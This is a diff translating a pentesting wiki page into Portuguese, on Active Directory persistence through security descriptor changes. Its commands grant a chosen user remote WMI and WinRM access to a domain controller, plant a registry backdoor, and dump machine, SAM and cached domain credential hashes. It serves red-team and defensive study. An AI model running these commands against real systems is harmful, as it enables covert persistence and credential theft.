@@ -4,34 +4,29 @@
 
 ## Security Descriptors
 
-[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): A Linguagem de Definição de Descritor de Segurança (SDDL) define o formato que é usado para descrever um descritor de segurança. SDDL usa strings ACE para DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-The **security descriptors** are used to **store** the **permissions** an **object** has **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.
+Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um **objeto**. Se você puder **fazer** uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.
 
-Then, this persistence technique is based on the ability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.
+Então, essa técnica de persistência é baseada na capacidade de obter todos os privilégios necessários contra certos objetos, para poder realizar uma tarefa que geralmente requer privilégios de administrador, mas sem a necessidade de ser administrador.
 
 ### Access to WMI
 
-You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
-
+Você pode dar a um usuário acesso para **executar remotamente WMI** [**usando isso**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
+### Acesso ao WinRM
 
-### Access to WinRM
-
-Give access to **winrm PS console to a user** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
-
+Dê acesso ao **console PS do winrm a um usuário** [**usando isso**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
+### Acesso remoto a hashes
 
-### Remote access to hashes
-
-Access the **registry** and **dump hashes** creating a **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** so you can at any moment retrieve the **hash of the computer**, the **SAM** and any **cached AD** credential in the computer. So, it's very useful to give this permission to a **regular user against a Domain Controller computer**:
-
+Acesse o **registro** e **extraia hashes** criando um **backdoor de registro usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que você possa a qualquer momento recuperar o **hash do computador**, o **SAM** e qualquer **credencial AD** em cache no computador. Portanto, é muito útil conceder essa permissão a um **usuário regular contra um computador Controlador de Domínio**:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -45,8 +40,6 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-
-Check [**Silver Tickets**](silver-ticket.md) to learn how you could use the hash of the computer account of a Domain Controller.
+Verifique [**Silver Tickets**](silver-ticket.md) para aprender como você pode usar o hash da conta do computador de um Controlador de Domínio.
 
 {{#include ../../banners/hacktricks-training.md}}
-
